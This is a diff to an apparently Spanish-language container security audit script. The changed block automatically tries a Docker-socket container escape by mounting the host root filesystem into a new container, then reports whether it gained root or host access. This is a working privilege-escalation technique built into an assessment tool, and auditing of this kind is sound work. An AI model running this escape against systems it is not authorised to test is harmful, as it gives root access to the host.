@@ -1028,28 +1028,31 @@ if [ $IN_CONTAINER -eq 1 ] && [ $DOCKER_SOCKET_WRITABLE -eq 1 ] && command -v do
     ESCAPE_IMAGE=$(docker images --quiet 2>/dev/null | head -1)
 
     if [ ! -z "$ESCAPE_IMAGE" ]; then
-        alert_critical "🔓 Intentando escape con: docker run -it -v /:/host/ $ESCAPE_IMAGE chroot /host/ bash"
+        alert_critical "🔓 Intentando escape con: docker run -v /:/host/ $ESCAPE_IMAGE chroot /host/ bash"
         echo ""
-        echo -e "${YELLOW}Ejecutando comando...${NC}"
+        echo -e "${YELLOW}Ejecutando comando (timeout 3s)...${NC}"
         echo ""
 
-        # Intentar el escape con timeout
-        ESCAPE_RESULT=$(timeout 5 docker run -it -v /:/host/ "$ESCAPE_IMAGE" chroot /host/ bash -c "id; pwd; echo 'ESCAPE_SUCCESS'" 2>&1 || true)
+        # Intento 1: Escape simple sin interactividad
+        ESCAPE_RESULT=$(timeout 3 docker run --rm -v /:/host/ "$ESCAPE_IMAGE" sh -c "id; pwd; cat /etc/hostname; echo 'ESCAPE_OK'" 2>&1 || echo "TIMEOUT_OR_ERROR")
 
-        if echo "$ESCAPE_RESULT" | grep -q "ESCAPE_SUCCESS"; then
-            alert_critical "✅ ESCAPE EXITOSO! Estás fuera del contenedor"
+        if echo "$ESCAPE_RESULT" | grep -q "ESCAPE_OK"; then
+            alert_critical "✅ ESCAPE EXITOSO! Acceso obtenido al host"
             echo "$ESCAPE_RESULT" | sed 's/^/  /'
             ((CRITICAL++))
         elif echo "$ESCAPE_RESULT" | grep -q "uid=0"; then
-            alert_high "⚠️  Comando ejecutado con permisos (uid=0 posible)"
-            echo "$ESCAPE_RESULT" | head -10 | sed 's/^/  /'
+            alert_high "⚠️  Ejecutado con uid=0 (root)"
+            echo "$ESCAPE_RESULT" | head -5 | sed 's/^/  /'
             ((HIGH++))
+        elif echo "$ESCAPE_RESULT" | grep -q "TIMEOUT_OR_ERROR"; then
+            alert_medium "⏱️  Escape timeout o error - posible restricción"
+            info "Puede necesitar privilegios elevados o socket no accesible"
         else
-            if [ ! -z "$ESCAPE_RESULT" ]; then
-                alert_medium "Respuesta del contenedor:"
-                echo "$ESCAPE_RESULT" | head -10 | sed 's/^/  /'
+            if [ ! -z "$ESCAPE_RESULT" ] && [ "$ESCAPE_RESULT" != "TIMEOUT_OR_ERROR" ]; then
+                alert_medium "Respuesta recibida:"
+                echo "$ESCAPE_RESULT" | head -5 | sed 's/^/  /'
             else
-                info "No response from escape attempt (check logs)"
+                info "Sin respuesta del escape (posible restricción)"
             fi
         fi
     else
